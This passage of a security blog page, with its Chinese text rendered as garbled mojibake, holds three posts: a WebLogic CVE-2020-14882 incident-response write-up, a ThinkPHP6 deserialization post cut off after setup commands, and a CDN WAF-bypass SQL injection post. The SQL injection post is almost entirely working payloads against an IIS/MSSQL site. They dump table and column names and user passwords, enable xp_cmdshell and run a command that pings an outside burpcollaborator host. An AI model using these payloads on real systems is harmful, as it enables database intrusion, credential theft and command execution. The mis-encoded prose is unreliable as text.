            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index"><span itemprop="name">åº”æ€¥å“åº”</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h2><p>2021å¹´5æœˆ26æ—¥æ—©ï¼Œçªç„¶æ”¶åˆ°åŒäº‹é€šçŸ¥ï¼Œäº‘å¹³å°æŸæœåŠ¡å™¨Aå‡ºç°å¼‚å¸¸ã€‚è¡¨åƒä¸ºï¼šAå¯¹å…¶ä»–ä¸»æœºè¿›è¡Œæ¼æ´æ‰«ææ”»å‡»ã€‚</p>
<h2 id="0x02-äº‹ä»¶å¤„ç½®"><a href="#0x02-äº‹ä»¶å¤„ç½®" class="headerlink" title="0x02 äº‹ä»¶å¤„ç½®"></a>0x02 äº‹ä»¶å¤„ç½®</h2><h3 id="è·å–åŸºæœ¬ä¿¡æ¯"><a href="#è·å–åŸºæœ¬ä¿¡æ¯" class="headerlink" title="è·å–åŸºæœ¬ä¿¡æ¯"></a>è·å–åŸºæœ¬ä¿¡æ¯</h3><p><strong>è®¿è°ˆç›¸å…³äººå‘˜ï¼š</strong></p>
<ol>
<li>æœåŠ¡å™¨IP&#x2F;åŸŸååœ°å€ï¼š<code>***.***.118.103</code>ï¼Œ<code>****.*****.***.cn</code>ï¼›</li>
<li>æœåŠ¡å™¨åç§°ï¼šåŸ¹è®­è€ƒå‹¤ç­¾åˆ°ç³»ç»Ÿï¼›</li>
<li>ä¸Šçº¿æ—¶é—´ï¼š2021å¹´1æœˆï¼›</li>
<li>æ˜¯å¦å¯¹äº’è”ç½‘æœåŠ¡ï¼šæ˜¯ï¼›</li>
<li>ä¸­é—´ä»¶ï¼šweblogic 12.1ï¼Œå‰æ®µæ—¶é—´æ’æŸ¥è¿‡ç¨‹å‘ç°å­˜åœ¨æ¼æ´ï¼Œç”±äºè¿ç»´æ— æ³•æä¾›è¡¥ä¸ï¼Œé‡‡å–ç¦ç”¨ T3 åŠ IIOP åè®®ç¼“è§£éƒ¨åˆ†æ¼æ´ï¼Œç»§ç»­å¯¹å¤–æœåŠ¡ï¼›</li>
<li>ä½•æ—¶å‡ºç°å¼‚å¸¸ç°åœºï¼š2021å¹´5æœˆ26æ—¥ï¼›</li>
<li>å¼‚å¸¸æƒ…å†µï¼šå¯¹å…¶ä»–æœåŠ¡å™¨è¿›è¡Œæ‰«ææ”»å‡»ï¼›</li>
<li>å…¶ä»–ä¿¡æ¯ï¼šé‡‡ç”¨ HTTPS æ–¹å¼åŠ å¯†ä¼ è¾“ï¼›å†…éƒ¨è´Ÿè½½å‡è¡¡åœ°å€ï¼š<code>***.**.26.191</code>ï¼Œç«¯å£ï¼š<code>443</code>ï¼›å¤–éƒ¨è´Ÿè½½å‡è¡¡åœ°å€ï¼š<code>***.**.26.10</code>ï¼Œç«¯å£ï¼š<code>443</code>ï¼›æœåŠ¡å™¨ä¸Šçº¿è¿‡ç¨‹ä¸­å­˜åœ¨ä¸è§„èŒƒï¼Œå®‰å…¨äººå‘˜ä¸çŸ¥æƒ…ï¼ŒæœåŠ¡å™¨æœªåŠ å…¥ WAF ç­‰å®‰å…¨è®¾å¤‡è¿›è¡Œä¿æŠ¤ ã€‚</li>
</ol>
<h3 id="æ¶æ„æ–‡ä»¶æŸ¥æ€"><a href="#æ¶æ„æ–‡ä»¶æŸ¥æ€" class="headerlink" title="æ¶æ„æ–‡ä»¶æŸ¥æ€"></a>æ¶æ„æ–‡ä»¶æŸ¥æ€</h3><p>å¯¹æœåŠ¡å™¨Aè¿›è¡Œæ¶æ„æ–‡ä»¶æŸ¥æ€ï¼Œå‘ç°æœåŠ¡å™¨æ˜¯è£¸å¥”ï¼Œä¸´æ—¶ä¸‹è½½ç«ç»’åˆDç›¾å¯¹æœåŠ¡å™¨è¿›è¡Œæ¶æ„æ–‡ä»¶è¯†åˆ«ï¼ˆä¸å»ºè®®ä½¿ç”¨ç«ç»’ï¼‰ï¼Œç«ç»’è¯†åˆ«4ä¸ªæ¶æ„æ–‡ä»¶ï¼ŒDç›¾è¯†åˆ«6ä¸ªæ¶æ„æ–‡ä»¶ï¼Œæ–‡ä»¶åˆ›å»ºäº‹ä»¶å‡ä¸º5æœˆ25æ—¥ã€‚</p>
<h3 id="æµé‡åˆ†æå¹³å°è®°å½•åˆ†æ"><a href="#æµé‡åˆ†æå¹³å°è®°å½•åˆ†æ" class="headerlink" title="æµé‡åˆ†æå¹³å°è®°å½•åˆ†æ"></a>æµé‡åˆ†æå¹³å°è®°å½•åˆ†æ</h3><p>ç¿»æŸ¥NGSOCå…³äº <code>***.***.118.103</code> çš„WEBæµé‡è®°å½•ï¼Œåªæœ‰é›¶æ˜Ÿå‡ æ¡ï¼Œæ— æ³•è·å–æœ‰æ•ˆä¿¡æ¯ã€‚</p>
<p>ç¿»æŸ¥ access æ—¥å¿—å°è¯•è·å–æœ‰ç”¨ä¿¡æ¯çš„æ—¶å€™ï¼Œå‘ç°æ—¥å¿—ä¸­æœ‰weblogic çš„ CVE-2020-14882 æ”»å‡»è®°å½•ï¼Œpayload ä½œç”¨ä¸ºåå¼¹shellï¼Œæ ¹æ® payload çš„ä¸Šçš„åå¼¹åœ°å€å‘ç°ä¸€ä¸ªæ”»å‡»è€…IPï¼Œå°è¯•åœ¨NGSOCä¸Šæœç´¢è¯¥æº IP åœ°å€ï¼Œå‘ç°è®°å½•ï¼Œå…¶ä¸­è¯¥è®°å½•ç›®çš„åœ°å€ä¸ºï¼š <code>***.**.26.10</code> ã€‚è®¿é—®ç®¡ç†å‘˜åå‘ç°äº’è”ç½‘åœ°å€ä¸ <code>***.***.118.103</code> é€šè®¯ï¼Œéœ€ç»è¿‡å†…å¤–è´Ÿè½½å‡è¡¡ï¼Œå¤–éƒ¨è´Ÿè½½å‡è¡¡åœ°å€ä¸ºï¼š <code>***.**.26.10</code> ã€‚</p>
<p>æŸ¥è¯¢å…³äºå¤–éƒ¨è´Ÿè½½å‡è¡¡åœ°å€ï¼ˆ <code>***.**.26.10</code> ï¼‰çš„ WEB æµé‡è®°å½•ï¼Œä¾ç„¶åªæœ‰é›¶æ˜Ÿå‡ æ¡è®°å½•ï¼Œé™·å…¥æ­»å±€ã€‚è¿‡äº†ä¸€æ®µæ—¶é—´ï¼ŒåŸæ¥æ˜¯å¿½ç•¥äº†æœåŠ¡å™¨é‡‡ç”¨ HTTPS åŠ å¯†åè®®ä¼ è¾“ï¼Œä¸”æœªå°†è¯ä¹¦ç§é’¥å¯¼å…¥ <strong>NDS</strong> å†…ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡ <code>FLOW_WEB</code> è¡¨æŸ¥è¯¢ WEB æµé‡è®°å½•ï¼Œåªèƒ½é€šè¿‡ <code>FLOW_SSL</code> è¡¨æŸ¥è¯¢ SS LåŠ å¯†åå•†æµé‡ï¼Œç„¶è€Œ SSL åŠ å¯†æµé‡çš„å†…å®¹å®Œå…¨çœ‹ä¸åˆ°ï¼Œåªèƒ½æŸ¥è¯¢è¯¥æ®µæ—¶é—´å“ªäº› IP è®¿é—®è¿‡ã€‚</p>
<p>é€šè¿‡ NGSOC å¹³å°æœç´¢è¯­æ³•ç­›é€‰5æœˆ21-26æ—¥è®¿é—®è¯¥åº”ç”¨ç³»ç»Ÿçš„äº’è”ç½‘åœ°å€ï¼Œå‘ç°ä»25æ—¥å‡Œæ™¨å¼€å§‹æœ‰19ä¸ªå¼‚å¸¸é«˜é¢‘çš„è®¿é—®è®°å½•ï¼Œå¤§å¤šæ•°ä¸ºæ¥è‡ªä¸­å›½å››å·ã€‚</p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>IP</th>
<th>IPçš„ç‰©ç†ä½ç½®</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>39.144.137.***</td>
<td>å››å·çœ æˆéƒ½å¸‚</td>
</tr>
<tr>
<td>2</td>
<td>39.144.137.**</td>
<td>å››å·çœ æˆéƒ½å¸‚</td>
</tr>
<tr>
<td>3</td>
<td>139.207.149.***</td>
<td>å››å·çœ</td>
</tr>
<tr>
<td>4</td>
<td>81.69.33.***</td>
<td>ä¸Šæµ·å¸‚</td>
</tr>
<tr>
<td>5</td>
<td>39.144.137.***</td>
<td>å››å·çœ æˆéƒ½å¸‚</td>
</tr>
<tr>
<td>6</td>
<td>171.210.45.***</td>
<td>å››å·çœ</td>
</tr>
<tr>
<td>7</td>
<td>116.169.1.***</td>
<td>å››å·çœ æˆéƒ½å¸‚</td>
</tr>
<tr>
<td>8</td>
<td>125.34.74.**</td>
<td>åŒ—äº¬å¸‚</td>
</tr>
<tr>
<td>9</td>
<td>171.88.165.***</td>
<td>å››å·çœ æˆéƒ½å¸‚</td>
</tr>
<tr>
<td>10</td>
<td>171.221.43.***</td>
<td>å››å·çœ æˆéƒ½å¸‚</td>
</tr>
<tr>
<td>11</td>
<td>114.253.56.***</td>
<td>åŒ—äº¬å¸‚</td>
</tr>
<tr>
<td>12</td>
<td>117.136.32.***</td>
<td>å¹¿å·å¸‚</td>
</tr>
<tr>
<td>13</td>
<td>106.13.30.***</td>
<td>å¹¿å·å¸‚</td>
</tr>
<tr>
<td>14</td>
<td>165.227.136.***</td>
<td>å¾·å›½ é»‘æ£®å· ç¾å› æ²³ç•”æ³•å…°å…‹ç¦</td>
</tr>
<tr>
<td>15</td>
<td>222.212.129.***</td>
<td>å››å·çœ æˆéƒ½å¸‚</td>
</tr>
<tr>
<td>16</td>
<td>45.146.164.***</td>
<td>ä¿„ç½—æ–¯ è«æ–¯ç§‘å· è«æ–¯ç§‘</td>
</tr>
<tr>
<td>17</td>
<td>45.147.197.***</td>
<td>è·å…° æµ·å°”å¾·å…°çœ æœå»·èµ«å§†</td>
</tr>
<tr>
<td>18</td>
<td>115.171.244.**</td>
<td>åŒ—äº¬å¸‚</td>
</tr>
<tr>
<td>19</td>
<td>198.20.69.**</td>
<td>ç¾å›½ äºšåˆ©æ¡‘é‚£å· è²å°¼å…‹æ–¯</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="æ–‡ä»¶åˆ†æ"><a href="#æ–‡ä»¶åˆ†æ" class="headerlink" title="æ–‡ä»¶åˆ†æ"></a>æ–‡ä»¶åˆ†æ</h3><p>ç»“åˆæ¶æ„æ–‡ä»¶åˆ›å»ºæ—¶é—´åŠ NGSOCæµ é‡è®°å½•ä¿¡æ¯ï¼Œåˆ¤æ–­æ”»å‡»è€…å¼€å±•æ”»å‡»æ—¶é—´ä¸º2021å¹´5æœˆ25æ—¥å‡Œæ™¨0æ—¶è‡³2021å¹´5æœˆ26æ—¥ä¸Šåˆ10ç‚¹30åˆ†ï¼ˆæœåŠ¡å™¨æ–­ç½‘æ—¶é—´ç‚¹ï¼‰ã€‚ä¸ºæ›´å…¨é¢å‘ç°æœåŠ¡å™¨Aå­˜åœ¨çš„æ¶æ„æ–‡ä»¶ï¼Œå°†2021å¹´5æœˆ25æ—¥-26æ—¥æ–°å¢çš„æ–‡ä»¶å…¨éƒ¨å¤‡ä»½å¹¶å¼€å±•äººå·¥åˆ†æã€‚é€šè¿‡äººå·¥åˆ†æï¼Œä»161ä¸ªæ–‡ä»¶ä¸­å‘ç°27ä¸ªæ¶æ„æ–‡ä»¶ï¼ˆå«Dç›¾åŠç«ç»’è¯†åˆ«å‡ºæ¥çš„æ¶æ„æ–‡ä»¶ï¼‰ï¼Œæ¶æ„æ–‡ä»¶ç±»å‹åŒ…æ‹¬ï¼šwebshell(å†°èæœ¨é©¬)ã€æµé‡ä»£ç†æ–‡ä»¶ã€MS17-010 æ‰«æå·¥å…·ã€Windowså¯†ç æå–å·¥å…·ï¼ˆmimikatz.exeã€procdump64.exeï¼‰ã€CSæœ¨é©¬ã€ä¸»æœºæ‰«æå·¥å…·ç­‰ã€‚</p>
<p>åˆ†æCSé©¬è¿‡ç¨‹ä¸­ï¼Œå‘ç°åè¿åŸŸååŠåè¿IPåœ°å€ï¼Œ <code>3ead0dfe.ns2.*****.site</code> ã€ <code>3ead0dfe.ns2.*****.site</code> ã€ <code>171.***.***.***</code> ã€‚é€šè¿‡whoisã€æœç´¢å¼•æ“ç»“åˆåŸŸåä¿¡æ¯æŸ¥åˆ°æ”»å‡»è€…QQå·ï¼Œç…§ç‰‡ç­‰ä¸ªäººä¿¡æ¯ã€‚</p>
<blockquote>
<p>PSï¼šè‡ªåŠ¨åŒ–åˆ†æå¹³å°ï¼š</p>
</blockquote>
<ol>
<li><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://app.any.run/">https://app.any.run/</a></li>
</ol>
<blockquote>
<p>æ‰‹åŠ¨è¡Œä¸ºåˆ†æå·¥å…·ï¼šç«ç»’å‰‘ã€promon</p>
</blockquote>
<h3 id="è¡Œä¸ºåˆ†æ"><a href="#è¡Œä¸ºåˆ†æ" class="headerlink" title="è¡Œä¸ºåˆ†æ"></a>è¡Œä¸ºåˆ†æ</h3><p>PcLog æŸ¥è¯¢ç³»ç»Ÿæ“ä½œï¼Œå‘ç°5æœˆ25æ—¥15ç‚¹00åˆ†æ‰§è¡Œè¿‡CSæœ¨é©¬â€œ123321.exeâ€ , æ‰§è¡Œç»“æœä¸ºå¤±è´¥ï¼Œè½¯ä»¶å´©æºƒã€‚æ­¤å¤–ï¼Œå…¶ä»–ä¿¡æ¯å‡ä¸ºç™»é™†è®°å½•ã€‚<br>RegRipper3.0 æŸ¥è¯¢ Amcacheï¼Œå‘ç°5æœˆ25æ—¥åˆ†åˆ«æ‰§è¡Œè¿‡ dns.exeã€fscsn64.exeã€123321.exeã€amd.exeã€mimikatz.exeã€‚<br>RegistryExplorer æŸ¥è¯¢ UserAssistï¼Œæœªå‘ç°5æœˆ25æ—¥çš„ä¿¡æ¯ã€‚</p>
<h2 id="0x03-åˆ†æç»“æœ"><a href="#0x03-åˆ†æç»“æœ" class="headerlink" title="0x03Â åˆ†æç»“æœ"></a>0x03Â åˆ†æç»“æœ</h2><p>access æ—¥å¿—è®°å½•ä¿¡æ¯ä¸å…¨ï¼ˆåŸå› æœªçŸ¥ï¼ŒHTTPSåè®®çš„å…³ç³»ï¼Ÿï¼‰ï¼Œæµé‡è®°å½•åˆ†æå¹³å°çš„ç›¸å…³å†…å®¹å‡æ˜¯åŠ å¯†çŠ¶æ€ï¼Œæ— æ³•æŸ¥çœ‹ã€‚æ ¹æ®ä¸­é—´ä»¶æƒ…å†µï¼ˆæœªå®‰è£…çš„è¡¥ä¸çš„weblogicï¼‰åŠæ¶æ„æ–‡ä»¶çš„å­˜æ”¾çš„è·¯å¾„ï¼Œæ¨æ–­æ”»å‡»è€…é€šè¿‡weblogicååºåˆ—åŒ–æ¼æ´å…¥ä¾µã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/%E6%9F%90CDN-SQLi%E6%B3%A8%E5%85%A5Bypass/" class="post-title-link" itemprop="url">æŸCDN SQLiæ³¨å…¥Bypass</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-19 12:52:17 / Modified: 13:02:29" itemprop="dateCreated datePublished" datetime="2022-03-19T12:52:17+08:00">2022-03-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQLi/" itemprop="url" rel="index"><span itemprop="name">SQLi</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-å‰è¨€ï¼š"><a href="#0x01-å‰è¨€ï¼š" class="headerlink" title="0x01 å‰è¨€ï¼š"></a>0x01 å‰è¨€ï¼š</h2><p>æŸæ¬¡æµ‹è¯•ï¼Œå‘ç°ç›®æ ‡å­˜åœ¨ SQLi æ³¨å…¥æ¼æ´ï¼Œç«™ç‚¹é‡‡ç”¨æŸä¿¡æœCDNï¼Œä¸”æä¾›é˜²æŠ¤åŠŸèƒ½ã€‚ç”±äºæ— æ³•æ‰¾åˆ°çœŸå®IPåœ°å€ï¼Œé‚æœ‰æœ¬æ¬¡æµ‹è¯•ã€‚</p>
<h2 id="0x02-Payload"><a href="#0x02-Payload" class="headerlink" title="0x02 Payload"></a>0x02 Payload</h2><p>ç›®æ ‡ç«™ç‚¹ä¿¡æ¯ä¸€è§ˆè¡¨</p>
<ul>
<li>ä¸­é—´ä»¶ï¼šIIS</li>
<li>æ•°æ®åº“ï¼šMSSQL</li>
<li>è„šæœ¬è¯­è¨€ï¼šaspx</li>
</ul>
<h3 id="Payloadï¼š"><a href="#Payloadï¼š" class="headerlink" title="Payloadï¼š"></a>Payloadï¼š</h3><h4 id="ç»•è¿‡-union-selec-å¸¸è§„å‡½æ•°-ï¼š"><a href="#ç»•è¿‡-union-selec-å¸¸è§„å‡½æ•°-ï¼š" class="headerlink" title="ç»•è¿‡ union selec+å¸¸è§„å‡½æ•° ï¼š"></a>ç»•è¿‡ <code>union selec+å¸¸è§„å‡½æ•°</code> ï¼š</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall select--^!~%*/%0b%0anull,null,null,null,db_name--%0a(),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--</span></span><br></pre></td></tr></table></figure>

<h4 id="ç»•è¿‡-union-select-x-from-x-ï¼š"><a href="#ç»•è¿‡-union-select-x-from-x-ï¼š" class="headerlink" title="ç»•è¿‡ union select x from x ï¼š"></a>ç»•è¿‡ <code>union select x from x </code>ï¼š</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b/*%0aall(select--^!~%*/%0b/*%0anull,null,null,null,1,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b/*%0afrom--^!~%*/%0b/*%0ax)--</span></span><br></pre></td></tr></table></figure>

<h4 id="ç»•è¿‡-union-all-select-x-from-x-ï¼š"><a href="#ç»•è¿‡-union-all-select-x-from-x-ï¼š" class="headerlink" title="ç»•è¿‡ union all select x from x ï¼š"></a>ç»•è¿‡ <code>union all select x from x</code> ï¼š</h4><p><strong>æŸ¥è¡¨åï¼š</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2 union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,name,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asysobjects)--</span></span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥å­—æ®µåï¼š</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,COLUMN_NAME,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0ainformation_schema.COLUMNS where TABLE_NAME=&#x27;</span>sys_User<span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥æ•°æ®ï¼š</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b%0aall(--^!~%*/%0b%0aselect--^!~%*/%0b/*%0anull,null,null,null,U_LoginName,U_Password ,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--^!~%*/%0b%0afrom--/*^~%%0bx*/%0asys_User)--</span></span><br></pre></td></tr></table></figure>

<p><strong>å¼€å¯xp_cmdshellï¼š</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;EXEC--^!~%*/%0b%0asp_configure &#x27;</span><span class="keyword">show</span> advanced options<span class="string">&#x27;, 1;RECONFIGURE;EXEC--^!~%*/%0b%0asp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;, 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>

<p><strong>æ‰§è¡Œpingå‘½ä»¤æµ‹è¯•ï¼š</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;and--^!~%*/%0b%0a1=2%20union--^!~%*/%0b/*%0aall%20select--^!~%*/%0b%0anull,null,null,null,SERVERPROPERTY--%0a(%27MachineName%27),2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;exec--^!~%*/%0b%0amaster..xp_cmdshell%20%27ping%20hn81hzwt1rqcgj20qnh50is0drjh76.burpcollaborator.net%27--</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="singsing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="singsing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/" class="post-title-link" itemprop="url">ThinkPHP6.0.*ååºåˆ—åŒ–æ¼æ´-1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-19 11:58:41 / Modified: 12:50:27" itemprop="dateCreated datePublished" datetime="2022-03-19T11:58:41+08:00">2022-03-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-æ­å»ºç¯å¢ƒ"><a href="#0x01-æ­å»ºç¯å¢ƒ" class="headerlink" title="0x01-æ­å»ºç¯å¢ƒ"></a>0x01-æ­å»ºç¯å¢ƒ</h2><h3 id="å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼šhttps-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼šhttps-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼šhttps://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>å®˜æ–¹å®‰è£…æ•™ç¨‹ï¼š<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="è¸©å‘ä¸€"><a href="#è¸©å‘ä¸€" class="headerlink" title="è¸©å‘ä¸€"></a>è¸©å‘ä¸€</h3><p>å¯èƒ½é‡åˆ°çš„é—®é¢˜ composer ç›®å½•ä¸ºç©ºçš„æƒ…å†µï¼Œè§£å†³åŠæ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. åˆ‡æ¢åˆ°æ ¹ç›®å½•ã€æ ¸å¿ƒæ¡†æ¶ç›®å½•ï¼Œæ›´æ–°ã€‚æŒ‡ä»¤å¦‚ä¸‹: </span></span><br><span class="line">composer update </span><br><span class="line"><span class="comment">#2. æ›´æ–°composerè‡ªèº«ï¼ŒæŒ‡ä»¤å¦‚ä¸‹ï¼š</span></span><br><span class="line">composer seft-update</span><br></pre></td></tr></table></figure>

